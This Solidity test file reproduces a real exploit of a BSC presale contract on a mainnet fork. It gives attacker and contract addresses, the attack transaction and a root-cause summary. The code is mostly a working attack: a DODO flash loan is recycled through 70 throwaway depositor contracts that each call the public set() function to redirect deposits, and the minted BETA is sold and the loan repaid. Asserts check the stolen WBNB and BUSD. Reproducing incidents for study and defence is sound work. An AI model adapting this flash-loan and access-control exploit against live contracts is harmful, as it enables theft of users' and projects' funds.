// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 1.921686798824852706 WBNB and 46.474821659738262175 BUSD
// Attacker : 0xc49f2938327aA2cDc3F2f89Ed17B54b3671F05dE
// Attack Contract : 0x627ba7A2b5c07546D38614315CE85f28B332d79c
// Vulnerable Contract : 0x760C2aAa22220f24B9343b2a91A62dD664953853
// Attack Tx : https://bscscan.com/tx/0x47670c20325924e89aa87fcdd41df88c21246bd972056736e7964799831abf12
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x760C2aAa22220f24B9343b2a91A62dD664953853#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1092
//
// Attack summary: The attacker redirected the presale withdrawal address to its helper, recycled a
// 100 WBNB flash loan through 70 fresh depositor contracts, sold the minted BETA, and repaid DODO.
// Root cause: PresaleBEP20.set(address) is public and deposit() enforces its 100 BNB maximum only
// per msg.sender while immediately forwarding deposited BNB to the mutable withdrawAddress.

address constant ATTACKER = 0xc49F2938327aa2cDc3F2f89Ed17b54B3671F05DE;
address constant TRACE_ATTACK_CONTRACT = 0x627BA7A2b5c07546d38614315Ce85F28b332d79C;
address constant TRACE_HELPER = 0xC8A060Bb258dc126a253519a35484c966B8632e8;
address constant PRESALE = 0x760c2aAA22220f24b9343b2A91a62dd664953853;
address constant BETA = 0x2410F2372E8A3C77fbD5D61B88714d14582F37Db;
address constant BETA_BUSD_PAIR = 0x0096F850E13E2d9127Fe0fb5523965cADD27ffc7;
address constant BETA_WBNB_PAIR = 0xb238A09D9eC8c15C1441aEE4A5af02A166291076;
address constant DODO_POOL = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BUSD_TOKEN = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
uint256 constant FLASH_LOAN_AMOUNT = 100 ether;
uint256 constant CHILD_DEPOSITS = 70;
uint256 constant FIRST_BETA_SALE = 7000 ether;
string constant DEFAULT_BSC_RPC_URL = "https://bsc-mainnet.public.blastapi.io";

interface ITokenLike {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IWBNBLike is ITokenLike {
    function deposit() external payable;
    function withdraw(
        uint256 amount
    ) external;
}

interface IPresaleBEP20 {
    function set(
        address payable withdrawAddress
    ) external;
    function deposit() external payable;
}

interface IPancakePairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IDPPFlashLoan {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    address private profitReceiver;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BSC_RPC_URL", DEFAULT_BSC_RPC_URL), 49_951_833);

        profitReceiver = makeAddr("profitReceiver");
        fundingToken = WBNB_TOKEN;
        attacker = profitReceiver;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(TRACE_HELPER, "Trace Helper");
        vm.label(PRESALE, "PresaleBEP20");
        vm.label(BETA, "BETA");
        vm.label(BETA_BUSD_PAIR, "BETA/BUSD Pair");
        vm.label(BETA_WBNB_PAIR, "BETA/WBNB Pair");
        vm.label(DODO_POOL, "DODO Pool");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(BUSD_TOKEN, "BUSD");
    }

    function testExploit() public balanceLog {
        assertEq(IPancakePairLike(BETA_BUSD_PAIR).token0(), BETA);
        assertEq(IPancakePairLike(BETA_BUSD_PAIR).token1(), BUSD_TOKEN);
        assertEq(IPancakePairLike(BETA_WBNB_PAIR).token0(), BETA);
        assertEq(IPancakePairLike(BETA_WBNB_PAIR).token1(), WBNB_TOKEN);

        uint256 wbnbBefore = ITokenLike(WBNB_TOKEN).balanceOf(profitReceiver);
        uint256 busdBefore = ITokenLike(BUSD_TOKEN).balanceOf(profitReceiver);

        new BetaPresaleAttack(profitReceiver);

        assertEq(ITokenLike(WBNB_TOKEN).balanceOf(profitReceiver) - wbnbBefore, 1_921_686_798_824_852_706);
        assertEq(ITokenLike(BUSD_TOKEN).balanceOf(profitReceiver) - busdBefore, 46_474_821_659_738_262_175);
        assertEq(ITokenLike(WBNB_TOKEN).balanceOf(DODO_POOL), 261_758_849_579_073_468_662);
    }
}

contract BetaPresaleAttack {
    constructor(
        address _profitReceiver
    ) {
        BetaPresaleFlashBorrower borrower = new BetaPresaleFlashBorrower(_profitReceiver);
        borrower.execute();
    }
}

contract BetaPresaleFlashBorrower {
    address private immutable profitReceiver;

    constructor(
        address _profitReceiver
    ) {
        profitReceiver = _profitReceiver;
    }

    function execute() external {
        IDPPFlashLoan(DODO_POOL).flashLoan(FLASH_LOAN_AMOUNT, 0, address(this), abi.encode(uint256(1)));
    }

    receive() external payable {}

    function DPPFlashLoanCall(
        address,
        uint256 baseAmount,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == DODO_POOL, "not DODO");
        require(baseAmount == FLASH_LOAN_AMOUNT, "unexpected loan");

        IWBNBLike(WBNB_TOKEN).withdraw(baseAmount);

        for (uint256 i = 0; i < CHILD_DEPOSITS; ++i) {
            BetaDepositCycler cycler = new BetaDepositCycler();
            cycler.depositAndSweep{value: FLASH_LOAN_AMOUNT}(payable(address(this)));
        }

        _swapBetaForBusd(FIRST_BETA_SALE);
        _swapBetaForWbnb(ITokenLike(BETA).balanceOf(address(this)));

        require(address(this).balance >= FLASH_LOAN_AMOUNT, "BNB was not recycled");
        IWBNBLike(WBNB_TOKEN).deposit{value: FLASH_LOAN_AMOUNT}();
        require(ITokenLike(WBNB_TOKEN).transfer(DODO_POOL, FLASH_LOAN_AMOUNT), "flash repay failed");
    }

    function _swapBetaForBusd(
        uint256 betaAmount
    ) private {
        IPancakePairLike pair = IPancakePairLike(BETA_BUSD_PAIR);
        (uint112 reserveBeta, uint112 reserveBusd,) = pair.getReserves();
        uint256 busdOut = _amountOut(betaAmount, reserveBeta, reserveBusd);

        require(ITokenLike(BETA).transfer(BETA_BUSD_PAIR, betaAmount), "BETA transfer to BUSD pair failed");
        pair.swap(0, busdOut, profitReceiver, "");
    }

    function _swapBetaForWbnb(
        uint256 betaAmount
    ) private {
        IPancakePairLike pair = IPancakePairLike(BETA_WBNB_PAIR);
        (uint112 reserveBeta, uint112 reserveWbnb,) = pair.getReserves();
        uint256 wbnbOut = _amountOut(betaAmount, reserveBeta, reserveWbnb);

        require(ITokenLike(BETA).transfer(BETA_WBNB_PAIR, betaAmount), "BETA transfer to WBNB pair failed");
        pair.swap(0, wbnbOut, profitReceiver, "");
    }

    function _amountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) private pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 998;
        return amountInWithFee * reserveOut / (reserveIn * 1000 + amountInWithFee);
    }
}

contract BetaDepositCycler {
    function depositAndSweep(
        address payable withdrawReceiver
    ) external payable {
        IPresaleBEP20(PRESALE).set(withdrawReceiver);
        IPresaleBEP20(PRESALE).deposit{value: msg.value}();

        uint256 betaBalance = ITokenLike(BETA).balanceOf(address(this));
        require(ITokenLike(BETA).transfer(withdrawReceiver, betaBalance), "BETA sweep failed");
    }
}
